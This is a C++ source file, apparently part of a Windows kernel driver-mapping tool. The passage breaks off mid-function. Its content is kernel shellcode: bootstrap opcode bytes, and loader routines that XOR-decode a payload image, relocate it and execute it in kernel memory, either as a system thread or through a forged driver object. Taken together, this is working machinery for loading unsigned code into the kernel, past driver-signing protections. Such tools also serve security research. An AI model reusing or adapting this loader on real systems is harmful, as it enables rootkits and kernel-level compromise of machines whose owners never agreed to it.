/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2020 - 2025
*
*  TITLE:       SHELLCODE.CPP
*
*  VERSION:     1.44
*
*  DATE:        18 Aug 2025
*
*  Default driver mapping shellcode(s) implementation.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"


//
// WARNING: shellcode DOESN'T WORK in DEBUG
//

//
// Compiler/Linker: 
// 
// Disable: GS/Spectre/SDL and other bullshit.
// Favor Size & small code.
//

#define OB_DRIVER_PREFIX            L"\\Driver\\"
#define OB_DRIVER_PREFIX_SIZE       sizeof(OB_DRIVER_PREFIX) - sizeof(WCHAR)
#define OB_DRIVER_PREFIX_MAXSIZE    sizeof(OB_DRIVER_PREFIX)

#define MAX_BASE_SCIMPORTS_NODBGPRINT 7

//
// Import functions for shellcode.
//
typedef struct _FUNC_TABLE {
#ifdef ENABLE_DBGPRINT
    pfnDbgPrint DbgPrint;
#endif
    pfnExAllocatePoolWithTag ExAllocatePoolWithTag;
    pfnIofCompleteRequest IofCompleteRequest;
    pfnZwMapViewOfSection ZwMapViewOfSection;
    pfnZwUnmapViewOfSection ZwUnmapViewOfSection;
    pfnObReferenceObjectByHandle ObReferenceObjectByHandle;
    pfnObfDereferenceObject ObfDereferenceObject;
    pfnKeSetEvent KeSetEvent;
} FUNC_TABLE, * PFUNC_TABLE;

//
// Shellcode layout structure.
//

//
// InitCode             16
// BootstrapCode        BOOTSTRAPCODE_SIZE_VX
// Tag                  4
// SectionViewSize      8
// MmSectionObjectType  8
// SectionHandle        8
// ReadEventHandle      8
// Import               sizeof(FUNC_TABLE)
//
// Expected sizeof is 2048
//

//
// Maximum shellcode size.
// This value must fit into 2kb of general SHELLCODE structure size.
//
#define SC_MAX_SIZE 2048
#define SC_INIT_CODE_SIZE 16

#pragma pack(push, 1)
#define BOOTSTRAPCODE_SIZE_V1 ( SC_MAX_SIZE - SC_INIT_CODE_SIZE - \
    sizeof(ULONG) - sizeof(SIZE_T) - sizeof(PVOID) - sizeof(HANDLE) - sizeof(HANDLE) - sizeof(FUNC_TABLE) )

typedef struct _SHELLCODE {
    BYTE InitCode[SC_INIT_CODE_SIZE];
    BYTE BootstrapCode[BOOTSTRAPCODE_SIZE_V1];
    ULONG Tag;
    SIZE_T SectionViewSize;
    PVOID MmSectionObjectType; // Pointer to pointer
    HANDLE SectionHandle;
    HANDLE ReadyEventHandle;
    FUNC_TABLE Import;
} SHELLCODE, * PSHELLCODE;
#pragma pack(pop)

C_ASSERT(BOOTSTRAPCODE_SIZE_V1 > 0);
C_ASSERT(sizeof(SHELLCODE) == SC_MAX_SIZE);
C_ASSERT(FIELD_OFFSET(SHELLCODE, Tag) == SC_INIT_CODE_SIZE + BOOTSTRAPCODE_SIZE_V1);
C_ASSERT(FIELD_OFFSET(SHELLCODE, Import) + sizeof(FUNC_TABLE) == SC_MAX_SIZE);

//
// Globals used during debug.
//
static IO_STACK_LOCATION g_testIostl;
static ULONG64 g_DummyULONG64;

//
// ScBootstrapLdr.asm
// 
// 00 call +5
// 05 pop rcx
// 06 sub rcx, 5
// 0A jmps 10 
// 0B int 3
// 0C int 3
// 0D int 3
// 0E int 3
// 0F int 3
// 10 code
//
BYTE ScBootstrapLdr[] = { 0xE8, 0x00, 0x00, 0x00, 0x00, 0x59, 0x48, 0x83, 0xE9, 0x05, 0xEB, 0x04 };

//
// ScBootstrapLdrCommon.asm
// 
// 00 call +5
// 05 pop r8
// 07 sub r8, 5
// 0B jmps 10 
// 0D int 3
// 0E int 3
// 0F int 3
// 10 code
//
BYTE ScBootstrapLdrCommon[] = { 0xE8, 0x00, 0x00, 0x00, 0x00, 0x41, 0x58, 0x49, 0x83, 0xE8, 0x05, 0xEB, 0x03 };

/*
* ScGetBootstrapLdr
*
* Purpose:
*
* Return shellcode bootstrap loader pointer and size.
*
*/
PVOID ScGetBootstrapLdr(
    _In_ ULONG ShellVersion,
    _Out_opt_ PULONG Size
)
{
    ULONG size;
    PVOID ptr;

    switch (ShellVersion) {
    case KDU_SHELLCODE_V4:
        size = sizeof(ScBootstrapLdr);
        ptr = ScBootstrapLdr;
        break;
    default:
        size = sizeof(ScBootstrapLdrCommon);
        ptr = ScBootstrapLdrCommon;
        break;
    }

    if (Size) *Size = size;
    return ptr;
}

/*
*
*  Set of user mode test routines.
*
*/
FORCEINLINE
PIO_STACK_LOCATION IoGetCurrentIrpStackLocationTest(
    PIRP Irp
)
{
    UNREFERENCED_PARAMETER(Irp);

    OutputDebugStringA("Inside IoGetCurrentIrpStackLocationTest\r\n");

    g_testIostl.MajorFunction = IRP_MJ_CREATE;
    return &g_testIostl;
}

NTSTATUS NTAPI DriverEntryTest(
    _In_  struct _DRIVER_OBJECT* DriverObject,
    _In_  PUNICODE_STRING RegistryPath
)
{
    OutputDebugString(L"\r\n[>] DriverEntryTest\r\n");

    OutputDebugString(RegistryPath->Buffer);
    OutputDebugString(L"\r\nDriverObject->DriverName: ");
    OutputDebugString(DriverObject->DriverName.Buffer);

    OutputDebugString(L"\r\n[<] DriverEntryTest\r\n");

    return STATUS_SUCCESS;
}

VOID NTAPI ObMakeTemporaryObjectTest(
    PVOID Object)
{
    UNREFERENCED_PARAMETER(Object);

    OutputDebugStringA("Inside ObMakeTemporaryObjectTest\r\n");
}

NTSTATUS NTAPI ZwMakeTemporaryObjectTest(
    HANDLE Handle)
{
    UNREFERENCED_PARAMETER(Handle);

    OutputDebugStringA("Inside ZwMakeTemporaryObjectTest\r\n");

    return STATUS_SUCCESS;
}

NTSTATUS NTAPI ObInsertObjectTest(
    PVOID Object,
    PACCESS_STATE AccessState,
    ACCESS_MASK DesiredAccess,
    ULONG ObjectPointerBias,
    PVOID* NewObject,
    PHANDLE Handle)
{
    UNREFERENCED_PARAMETER(Object);
    UNREFERENCED_PARAMETER(AccessState);
    UNREFERENCED_PARAMETER(DesiredAccess);
    UNREFERENCED_PARAMETER(ObjectPointerBias);
    UNREFERENCED_PARAMETER(NewObject);

    OutputDebugStringA("Inside ObInsertObjectTest\r\n");

    *Handle = NULL;

    return STATUS_SUCCESS;
}

NTSTATUS NTAPI ObCreateObjectTest(
    KPROCESSOR_MODE ProbeMode,
    POBJECT_TYPE ObjectType,
    POBJECT_ATTRIBUTES ObjectAttributes,
    KPROCESSOR_MODE OwnershipMode,
    PVOID ParseContext,
    ULONG ObjectBodySize,
    ULONG PagedPoolCharge,
    ULONG NonPagedPoolCharge,
    PVOID* Object)
{
    UNREFERENCED_PARAMETER(ProbeMode);
    UNREFERENCED_PARAMETER(ObjectType);
    UNREFERENCED_PARAMETER(ObjectAttributes);
    UNREFERENCED_PARAMETER(OwnershipMode);
    UNREFERENCED_PARAMETER(ParseContext);
    UNREFERENCED_PARAMETER(PagedPoolCharge);
    UNREFERENCED_PARAMETER(NonPagedPoolCharge);

    OutputDebugStringA("Inside ObCreateObjectTest\r\n");

    *Object = HeapAlloc(GetProcessHeap(), 0, ObjectBodySize);

    return STATUS_SUCCESS;
}

VOID NTAPI ExQueueWorkItemTest(
    PWORK_QUEUE_ITEM WorkItem,
    WORK_QUEUE_TYPE QueueType)
{
    UNREFERENCED_PARAMETER(WorkItem);
    UNREFERENCED_PARAMETER(QueueType);

    OutputDebugStringA("Inside ExQueueWorkItemTest\r\n");
}

PVOID NTAPI ExAllocatePoolWithTagTest(
    POOL_TYPE PoolType,
    SIZE_T NumberOfBytes,
    ULONG Tag)
{
    PVOID P;
    UNREFERENCED_PARAMETER(PoolType);
    UNREFERENCED_PARAMETER(Tag);

    OutputDebugStringA("Inside ExAllocatePoolWithTagTest\r\n");

    P = VirtualAlloc(NULL, NumberOfBytes, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    return P;
}

VOID NTAPI ExFreePoolTest(
    PVOID P)
{
    OutputDebugStringA("Inside ExFreePoolTest\r\n");

    VirtualFree(P, 0, MEM_RELEASE);
}

VOID NTAPI ExFreePoolWithTagTest(
    PVOID P,
    ULONG Tag)
{
    UNREFERENCED_PARAMETER(Tag);

    OutputDebugStringA("Inside ExFreePoolWithTagTest\r\n");

    VirtualFree(P, 0, MEM_RELEASE);
}

PVOID NTAPI MmGetSystemRoutineAddressTest(
    PUNICODE_STRING SystemRoutineName
)
{
    UNREFERENCED_PARAMETER(SystemRoutineName);

    OutputDebugStringA("Inside MmGetSystemRoutineAddressTest\r\n");
    return NULL;
}

VOID IofCompleteRequestTest(
    VOID* Irp,
    CCHAR PriorityBoost)
{
    UNREFERENCED_PARAMETER(Irp);
    UNREFERENCED_PARAMETER(PriorityBoost);

    OutputDebugStringA("Inside IofCompleteRequestTest\r\n");
    return;
}

NTSTATUS NTAPI ZwCloseTest(
    HANDLE Handle
)
{
    OutputDebugStringA("Inside ZwCloseTest\r\n");

    if (Handle)
        return NtClose(Handle);
    else
        return STATUS_SUCCESS;
}

NTSTATUS NTAPI PsCreateSystemThreadTest(
    PHANDLE ThreadHandle,
    ULONG DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    HANDLE ProcessHandle,
    PCLIENT_ID ClientId,
    PKSTART_ROUTINE StartRoutine,
    PVOID StartContext)
{
    UNREFERENCED_PARAMETER(ThreadHandle);
    UNREFERENCED_PARAMETER(DesiredAccess);
    UNREFERENCED_PARAMETER(ObjectAttributes);
    UNREFERENCED_PARAMETER(ProcessHandle);
    UNREFERENCED_PARAMETER(ClientId);
    UNREFERENCED_PARAMETER(StartRoutine);
    UNREFERENCED_PARAMETER(StartContext);

    OutputDebugStringA("Inside PsCreateSystemThreadTest\r\n");
    return STATUS_SUCCESS;
}

NTSTATUS NTAPI KeSetEventTest(
    PKEVENT Event,
    KPRIORITY Increment,
    BOOLEAN Wait
)
{
    UNREFERENCED_PARAMETER(Event);
    UNREFERENCED_PARAMETER(Increment);
    UNREFERENCED_PARAMETER(Wait);

    OutputDebugStringA("Inside KeSetEventTest\r\n");
    return STATUS_SUCCESS;
}

NTSTATUS NTAPI ObReferenceObjectByHandleTest(
    HANDLE Handle,
    ACCESS_MASK DesiredAccess,
    POBJECT_TYPE ObjectType,
    KPROCESSOR_MODE AccessMode,
    PVOID* Object,
    PVOID HandleInformation
)
{
    UNREFERENCED_PARAMETER(Handle);
    UNREFERENCED_PARAMETER(DesiredAccess);
    UNREFERENCED_PARAMETER(ObjectType);
    UNREFERENCED_PARAMETER(AccessMode);
    UNREFERENCED_PARAMETER(Object);
    UNREFERENCED_PARAMETER(HandleInformation);

    OutputDebugStringA("Inside ObReferenceObjectByHandleTest\r\n");
    return STATUS_SUCCESS;
}

VOID NTAPI ObfDereferenceObjectTest(
    PVOID Object
)
{
    UNREFERENCED_PARAMETER(Object);
    OutputDebugStringA("Inside ObfDereferenceObjectTest\r\n");
}

ULONG NTAPI DbgPrintTest(
    PCHAR Format,
    ...
)
{
    UNREFERENCED_PARAMETER(Format);
    OutputDebugStringA("Inside DbgPrintTest\r\n");
    return 0;
}

//
// In case if MSVC trashes shellcode use #pragma optimize("", off)
//

/*
* ScLoaderRoutineV1
*
* Purpose:
*
* Bootstrap shellcode variant 4 (executed as code from preallocated area).
* Read image from shared section, process relocs and run it in allocated system thread.
*
* IRQL: PASSIVE_LEVEL
*
*/
VOID NTAPI ScLoaderRoutineV1(
    _In_ PSHELLCODE ShellCode
)
{
    NTSTATUS                        status;
    ULONG                           isz;
    HANDLE                          hThread;
    OBJECT_ATTRIBUTES               obja;
    ULONG_PTR                       img, exbuffer;

    PIMAGE_DOS_HEADER               dosh;
    PIMAGE_FILE_HEADER              fileh;
    PIMAGE_OPTIONAL_HEADER          popth;
    PIMAGE_BASE_RELOCATION          rel;

    DWORD_PTR                       delta;
    LPWORD                          chain;
    DWORD                           c, rsz, k, off;

    PUCHAR                          ptr;

    PKEVENT                         ReadyEvent;
    PVOID                           SectionRef, pvSharedSection = NULL, rawExAlloc;
    SIZE_T                          ViewSize;

    PPAYLOAD_HEADER_V1              PayloadHeader;
    POBJECT_TYPE*                   ppSecType;

#ifdef ENABLE_DBGPRINT
    CHAR                            szFormat1[] = { 'S', '%', 'l', 'x', 0 };
    CHAR                            szFormat2[] = { 'F', '%', 'l', 'x', 0 };
#endif

    ppSecType = (POBJECT_TYPE*)ShellCode->MmSectionObjectType;

    status = ShellCode->Import.ObReferenceObjectByHandle(
        ShellCode->SectionHandle,
        SECTION_ALL_ACCESS, 
        (ppSecType ? *ppSecType : NULL), 
        0, 
        (PVOID*)&SectionRef, 
        NULL);

    if (NT_SUCCESS(status)) {

        ViewSize = ShellCode->SectionViewSize;

        status = ShellCode->Import.ZwMapViewOfSection(ShellCode->SectionHandle,
            NtCurrentProcess(),
            (PVOID*)&pvSharedSection,
            0,
            PAGE_SIZE,
            NULL,
            &ViewSize,
            ViewUnmap,
            0,
            PAGE_READWRITE);

        if (NT_SUCCESS(status)) {

            k = ShellCode->Tag;

            PayloadHeader = (PAYLOAD_HEADER_V1*)pvSharedSection;
            rsz = PayloadHeader->ImageSize;
            ptr = (PUCHAR)pvSharedSection + sizeof(PAYLOAD_HEADER_V1);

            while (rsz--) {
                *ptr ^= k;
                k = _rotl(k, 1);
                ptr++;
            }

            img = (ULONG_PTR)pvSharedSection + sizeof(PAYLOAD_HEADER_V1);
            dosh = (PIMAGE_DOS_HEADER)img;
            fileh = (PIMAGE_FILE_HEADER)(img + sizeof(DWORD) + dosh->e_lfanew);
            popth = (PIMAGE_OPTIONAL_HEADER)((PBYTE)fileh + sizeof(IMAGE_FILE_HEADER));
            isz = popth->SizeOfImage;

            //
            // Allocate memory for mapped image.
            //
            rawExAlloc = ShellCode->Import.ExAllocatePoolWithTag(
                NonPagedPool,
                isz + PAGE_SIZE,
                ShellCode->Tag);

            if (rawExAlloc) {

                exbuffer = ((ULONG_PTR)rawExAlloc + (PAGE_SIZE - 1)) & ~(PAGE_SIZE - 1);
                delta = exbuffer - popth->ImageBase;

                //
                // Relocate image.
                //
                if (popth->NumberOfRvaAndSizes > IMAGE_DIRECTORY_ENTRY_BASERELOC) {
                    off = popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
                    rsz = popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
                    if (off && rsz && off + rsz <= isz) {
                        rel = (PIMAGE_BASE_RELOCATION)(img + off);
                        c = 0;
                        while (c < rsz) {
                            chain = (LPWORD)((PUCHAR)rel + sizeof(IMAGE_BASE_RELOCATION));
                            for (off = sizeof(IMAGE_BASE_RELOCATION); off < rel->SizeOfBlock; off += sizeof(WORD), chain++) {
                                if ((*chain >> 12) == IMAGE_REL_BASED_DIR64)
                                    *(PULONG_PTR)(img + rel->VirtualAddress + (*chain & 0x0FFF)) += delta;
                            }
                            c += rel->SizeOfBlock;
                            rel = (PIMAGE_BASE_RELOCATION)((PUCHAR)rel + rel->SizeOfBlock);
                        }
                    }
                }

                //
                // Copy image to allocated buffer. We can't use any fancy memcpy stuff here.
                //
                __movsb((PUCHAR)exbuffer, (const UCHAR*)img, isz);

                //
                // Create system thread with handler set to image entry point.
                //
                hThread = NULL;
                InitializeObjectAttributes(&obja, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);

                status = PayloadHeader->PsCreateSystemThread(&hThread, 
                    THREAD_ALL_ACCESS,
                    &obja, 
                    NULL, 
                    NULL,
                    (PKSTART_ROUTINE)(exbuffer + popth->AddressOfEntryPoint), 
                    NULL);

                if (NT_SUCCESS(status))
                    PayloadHeader->ZwClose(hThread);

                //
                // Save result.
                //
                PayloadHeader->IoStatus.Status = status;

            } //ExAllocatePoolWithTag(rawExAlloc)

            ShellCode->Import.ZwUnmapViewOfSection(NtCurrentProcess(),
                pvSharedSection);

        } //ZwMapViewOfSection(pvSharedSection)

        ShellCode->Import.ObfDereferenceObject(SectionRef);

        //
        // Fire the event to let userland know that we're ready.
        //
        status = ShellCode->Import.ObReferenceObjectByHandle(
            ShellCode->ReadyEventHandle,
            SYNCHRONIZE | EVENT_MODIFY_STATE, 
            NULL, 
            0, 
            (PVOID*)&ReadyEvent, 
            NULL);
        if (NT_SUCCESS(status))
        {
            ShellCode->Import.KeSetEvent(ReadyEvent, 0, FALSE);
            ShellCode->Import.ObfDereferenceObject(ReadyEvent);
        }

    } // ObReferenceObjectByHandle success

}

/*
* ScDispatchRoutineV3
*
* Purpose:
*
* Bootstrap shellcode variant 3.
* Read image from shared section, process relocs, allocate driver object and run driver entry point.
* 
* N.B. This shellcode version is for a very specific use only. Refer to docs for more info.
*
* IRQL: PASSIVE_LEVEL
*
*/
NTSTATUS NTAPI ScDispatchRoutineV3(
    _In_ struct _DEVICE_OBJECT* DeviceObject,
    _Inout_ struct _IRP* Irp,
    _In_ PSHELLCODE ShellCode)
{
    NTSTATUS                        status;
    ULONG                           isz;
    ULONG_PTR                       img, exbuffer;

    PIO_STACK_LOCATION              StackLocation;

    PIMAGE_DOS_HEADER               dosh;
    PIMAGE_FILE_HEADER              fileh;
    PIMAGE_OPTIONAL_HEADER          popth;
    PIMAGE_BASE_RELOCATION          rel;

    DWORD_PTR                       delta;
    LPWORD                          chain;
    DWORD                           c, rsz, k, off;

    PUCHAR                          ptr;

    PKEVENT                         ReadyEvent;
    PVOID                           SectionRef, pvSharedSection = NULL, IopInvalidDeviceIoControl, rawExAlloc;
    SIZE_T                          ViewSize;

    PPAYLOAD_HEADER_V3              PayloadHeader;

    ULONG                           objectSize;
    HANDLE                          driverHandle;
    PDRIVER_OBJECT                  driverObject;
    POBJECT_TYPE*                   ppSecType;
    OBJECT_ATTRIBUTES               objectAttributes;
    UNICODE_STRING                  driverName, regPath;

#ifdef ENABLE_DBGPRINT
    CHAR                            szFormat1[] = { 'S', '%', 'l', 'x', 0 };
    CHAR                            szFormat2[] = { 'F', '%', 'l', 'x', 0 };
#endif

#ifdef _DEBUG
    StackLocation = IoGetCurrentIrpStackLocationTest(Irp);
#else
    StackLocation = IoGetCurrentIrpStackLocation(Irp);
#endif

    if ((StackLocation->MajorFunction == IRP_MJ_CREATE)
        && (DeviceObject->SectorSize == 0))
    {
        ppSecType = (POBJECT_TYPE*)ShellCode->MmSectionObjectType;

        status = ShellCode->Import.ObReferenceObjectByHandle(
            ShellCode->SectionHandle,
            SECTION_ALL_ACCESS,
            (ppSecType ? *ppSecType : NULL),
            0,
            (PVOID*)&SectionRef,
            NULL);

        if (NT_SUCCESS(status)) {

            ViewSize = ShellCode->SectionViewSize;

            status = ShellCode->Import.ZwMapViewOfSection(ShellCode->SectionHandle,
                NtCurrentProcess(),
                (PVOID*)&pvSharedSection,
                0,
                PAGE_SIZE,
                NULL,
                &ViewSize,
                ViewUnmap,
                0,
                PAGE_READWRITE);

            if (NT_SUCCESS(status)) {

                k = ShellCode->Tag;

                PayloadHeader = (PAYLOAD_HEADER_V3*)pvSharedSection;
                rsz = PayloadHeader->ImageSize;
                ptr = (PUCHAR)pvSharedSection + sizeof(PAYLOAD_HEADER_V3);

                while (rsz--) {
                    *ptr ^= k;
                    k = _rotl(k, 1);
                    ptr++;
                }

                img = (ULONG_PTR)pvSharedSection + sizeof(PAYLOAD_HEADER_V3);
                dosh = (PIMAGE_DOS_HEADER)img;
                fileh = (PIMAGE_FILE_HEADER)(img + sizeof(DWORD) + dosh->e_lfanew);
                popth = (PIMAGE_OPTIONAL_HEADER)((PBYTE)fileh + sizeof(IMAGE_FILE_HEADER));
                isz = popth->SizeOfImage;

                //
                // Allocate memory for mapped image.
                //
                rawExAlloc = ShellCode->Import.ExAllocatePoolWithTag(
                    NonPagedPool,
                    isz + PAGE_SIZE,
                    ShellCode->Tag);

                if (rawExAlloc) {

                    exbuffer = ((ULONG_PTR)rawExAlloc + (PAGE_SIZE - 1)) & ~(PAGE_SIZE - 1);
                    delta = exbuffer - popth->ImageBase;

                    //
                    // Relocate image.
                    //
                    if (popth->NumberOfRvaAndSizes > IMAGE_DIRECTORY_ENTRY_BASERELOC) {
                        off = popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
                        rsz = popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
                        if (off && rsz && off + rsz <= isz) {
                            rel = (PIMAGE_BASE_RELOCATION)(img + off);
                            c = 0;
                            while (c < rsz) {
                                chain = (LPWORD)((PUCHAR)rel + sizeof(IMAGE_BASE_RELOCATION));
                                for (off = sizeof(IMAGE_BASE_RELOCATION); off < rel->SizeOfBlock; off += sizeof(WORD), chain++) {
                                    if ((*chain >> 12) == IMAGE_REL_BASED_DIR64)
                                        *(PULONG_PTR)(img + rel->VirtualAddress + (*chain & 0x0FFF)) += delta;
                                }
                                c += rel->SizeOfBlock;
                                rel = (PIMAGE_BASE_RELOCATION)((PUCHAR)rel + rel->SizeOfBlock);
                            }
                        }
                    }

                    //
                    // Copy image to allocated buffer. We can't use any fancy memcpy stuff here.
                    //
                    __movsb((PUCHAR)exbuffer, (const UCHAR*)img, isz);

                    //
                    // Remember Victim IRP_MJ_PNP as invalid device request handler.
                    //
                    IopInvalidDeviceIoControl = DeviceObject->DriverObject->MajorFunction[IRP_MJ_PNP];

                    driverName.Buffer = PayloadHeader->ObjectName.Buffer;
                    driverName.Length = PayloadHeader->ObjectName.Length;
                    driverName.MaximumLength = PayloadHeader->ObjectName.MaximumLength;

                    InitializeObjectAttributes(&objectAttributes, &driverName, 
                        OBJ_PERMANENT | OBJ_CASE_INSENSITIVE, NULL, NULL);

                    //
                    // We cannot use IoCreateDriver here as it supply DriverEntry with NULL as registry path.
                    //

                    //
                    // Calculate object body size, number of bytes used by ObManager in ExAllocate* call.
                    // Must include driver object body and real size of driver extension which tail is opaque
                    // and different on various versions of NT. Assume 40 extra bytes (as on Win10) is currently enough.
                    // 
                    // N.B. Correct this size according to future IopDeleteDriver changes.
                    //
                    objectSize = sizeof(DRIVER_OBJECT) +
                        sizeof(DRIVER_EXTENSION) +
                        40;

                    status = PayloadHeader->ObCreateObject(KernelMode, *(POBJECT_TYPE*)PayloadHeader->IoDriverObjectType,
                        &objectAttributes, KernelMode, NULL, objectSize, 0, 0, (PVOID*)&driverObject);

                    if (NT_SUCCESS(status)) {

                        __stosb((PUCHAR)driverObject, 0, objectSize);

                        driverObject->DriverExtension = (PDRIVER_EXTENSION)(driverObject + 1);
                        driverObject->DriverExtension->DriverObject = driverObject;
                        driverObject->Type = IO_TYPE_DRIVER;
                        driverObject->Size = sizeof(DRIVER_OBJECT);
                        driverObject->Flags = DRVO_BUILTIN_DRIVER;
                        driverObject->DriverInit = (PDRIVER_INITIALIZE)(exbuffer + popth->AddressOfEntryPoint);

                        for (c = 0; c <= IRP_MJ_MAXIMUM_FUNCTION; c++)
                            driverObject->MajorFunction[c] = IopInvalidDeviceIoControl;

                        //
                        // Allocate DriverExtension->ServiceKeyName. Failure is insignificant.
                        // In case of NULL ptr IopDeleteDriver will handle this correctly.
                        //
                        driverObject->DriverExtension->ServiceKeyName.Buffer = (PWSTR)ShellCode->Import.ExAllocatePoolWithTag(PagedPool,
                            driverName.Length + sizeof(WCHAR), SHELL_POOL_TAG);
                        if (driverObject->DriverExtension->ServiceKeyName.Buffer) {
                            driverObject->DriverExtension->ServiceKeyName.MaximumLength = driverName.MaximumLength;
                            driverObject->DriverExtension->ServiceKeyName.Length = driverName.Length;
                            __movsb((PUCHAR)driverObject->DriverExtension->ServiceKeyName.Buffer, (UCHAR*)driverName.Buffer, driverName.Length);
                        }

                        status = PayloadHeader->ObInsertObject(driverObject, 0, FILE_READ_ACCESS, 0, NULL, &driverHandle);

                        if (NT_SUCCESS(status)) {

                            //
                            // Reference object so we can close driver handle without object going away.
                            //
                            status = ShellCode->Import.ObReferenceObjectByHandle(driverHandle, 0, *(POBJECT_TYPE*)PayloadHeader->IoDriverObjectType, 
                                KernelMode, (PVOID*)&driverObject, NULL);
                            if (NT_SUCCESS(status)) {

                                PayloadHeader->ZwClose(driverHandle);

                                //
                                // Allocate DriverObject->DriverName. Failure is insignificant.
                                // In case of NULL ptr IopDeleteDriver will handle this correctly.
                                //
                                driverObject->DriverName.Buffer = (PWSTR)ShellCode->Import.ExAllocatePoolWithTag(PagedPool,
                                    driverName.MaximumLength, SHELL_POOL_TAG);
                                if (driverObject->DriverName.Buffer) {
                                    driverObject->DriverName.MaximumLength = driverName.MaximumLength;
                                    driverObject->DriverName.Length = driverName.Length;
                                    __movsb((PUCHAR)driverObject->DriverName.Buffer, (UCHAR*)driverName.Buffer, driverName.Length);
                                }

                                regPath.Buffer = PayloadHeader->RegistryPath.Buffer;
                                regPath.Length = PayloadHeader->RegistryPath.Length;
                                regPath.MaximumLength = PayloadHeader->RegistryPath.MaximumLength;

                                //
                                // Call entrypoint.
                                //
#ifdef _DEBUG
                                status = DriverEntryTest(driverObject, &regPath);
#else
                                status = ((PDRIVER_INITIALIZE)(exbuffer + popth->AddressOfEntryPoint))(
                                    driverObject,
                                    &regPath);
#endif

                                //
                                // Driver initialization failed, get rid of driver object.
                                //
                                if (!NT_SUCCESS(status)) {

                                    PayloadHeader->ObMakeTemporaryObject(driverObject);
                                    ShellCode->Import.ObfDereferenceObject(driverObject);

                                }

                            } else {
                                //
                                // ObReferenceObjectByHandle failed.
                                // Attempt to get rid of bogus object.
                                //
                                PayloadHeader->ZwMakeTemporaryObject(driverHandle);
                                PayloadHeader->ZwClose(driverHandle);
                            }

                        } 
#ifdef ENABLE_DBGPRINT
                        //
                        // ObInsertObject failed switch, on fail ObManager dereference newly created object automatically.
                        //
                        else {
                            //
                            // ObInsertObject failed, output debug here.
                            //
                        }
#endif

                    }
#ifdef ENABLE_DBGPRINT
                    //
                    // ObCreateObject failed switch, no need to do anything.
                    //
                    else {
                        //
                        // ObCreateObject failed, output debug here.
                        //
                    }
#endif
                    //
                    // Save result.
                    //
                    PayloadHeader->IoStatus.Status = status;

                    //
                    // Block further IRP_MJ_CREATE requests.
                    //
                    DeviceObject->SectorSize = 512;

                } //ExAllocatePoolWithTag(rawExAlloc)

                ShellCode->Import.ZwUnmapViewOfSection(NtCurrentProcess(),
                    pvSharedSection);

            } //ZwMapViewOfSection(pvSharedSection)

            ShellCode->Import.ObfDereferenceObject(SectionRef);

            //
            // Fire the event to let userland know that we're ready.
            //
            status = ShellCode->Import.ObReferenceObjectByHandle(ShellCode->ReadyEventHandle,
                SYNCHRONIZE | EVENT_MODIFY_STATE, NULL, 0, (PVOID*)&ReadyEvent, NULL);
            if (NT_SUCCESS(status))
            {
                ShellCode->Import.KeSetEvent(ReadyEvent, 0, FALSE);
                ShellCode->Import.ObfDereferenceObject(ReadyEvent);
            }

        } // ObReferenceObjectByHandle success

    }
    ShellCode->Import.IofCompleteRequest(Irp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}

/*
* ScDispatchRoutineV2
*
* Purpose:
*
* Bootstrap shellcode variant 2.
* Read image from shared section, process relocs and run it in a worker thread.
*
* IRQL: PASSIVE_LEVEL
*
*/
NTSTATUS NTAPI ScDispatchRoutineV2(
    _In_ struct _DEVICE_OBJECT* DeviceObject,
    _Inout_ struct _IRP* Irp,
    _In_ PSHELLCODE ShellCode)
{
    NTSTATUS                        status;
    ULONG                           isz;
    ULONG_PTR                       img, exbuffer;

    PIO_STACK_LOCATION              StackLocation;

    PIMAGE_DOS_HEADER               dosh;
    PIMAGE_FILE_HEADER              fileh;
    PIMAGE_OPTIONAL_HEADER          popth;
    PIMAGE_BASE_RELOCATION          rel;

    DWORD_PTR                       delta;
    LPWORD                          chain;
    DWORD                           c, rsz, k, off;

    PUCHAR                          ptr;

    PKEVENT                         ReadyEvent;
    PVOID                           SectionRef, pvSharedSection = NULL, rawExAlloc;
    SIZE_T                          ViewSize;

    POBJECT_TYPE*                   ppSecType;
    PPAYLOAD_HEADER_V2              PayloadHeader;

    WORK_QUEUE_ITEM* WorkItem;

#ifdef ENABLE_DBGPRINT
    CHAR                            szFormat1[] = { 'S', '%', 'l', 'x', 0 };
    CHAR                            szFormat2[] = { 'F', '%', 'l', 'x', 0 };
#endif

#ifdef _DEBUG
    StackLocation = IoGetCurrentIrpStackLocationTest(Irp);
#else
    StackLocation = IoGetCurrentIrpStackLocation(Irp);
#endif

    if ((StackLocation->MajorFunction == IRP_MJ_CREATE)
        && (DeviceObject->SectorSize == 0))
    {
        ppSecType = (POBJECT_TYPE*)ShellCode->MmSectionObjectType;

        status = ShellCode->Import.ObReferenceObjectByHandle(
            ShellCode->SectionHandle,
            SECTION_ALL_ACCESS,
            (ppSecType ? *ppSecType : NULL),
            0,
            (PVOID*)&SectionRef,
            NULL);

        if (NT_SUCCESS(status)) {

            ViewSize = ShellCode->SectionViewSize;

            status = ShellCode->Import.ZwMapViewOfSection(ShellCode->SectionHandle,
                NtCurrentProcess(),
                (PVOID*)&pvSharedSection,
                0,
                PAGE_SIZE,
                NULL,
                &ViewSize,
                ViewUnmap,
                0,
                PAGE_READWRITE);

            if (NT_SUCCESS(status)) {

                k = ShellCode->Tag;

                PayloadHeader = (PAYLOAD_HEADER_V2*)pvSharedSection;
                rsz = PayloadHeader->ImageSize;
                ptr = (PUCHAR)pvSharedSection + sizeof(PAYLOAD_HEADER_V2);

                while (rsz--) {
                    *ptr ^= k;
                    k = _rotl(k, 1);
                    ptr++;
                }

                img = (ULONG_PTR)pvSharedSection + sizeof(PAYLOAD_HEADER_V2);
                dosh = (PIMAGE_DOS_HEADER)img;
                fileh = (PIMAGE_FILE_HEADER)(img + sizeof(DWORD) + dosh->e_lfanew);
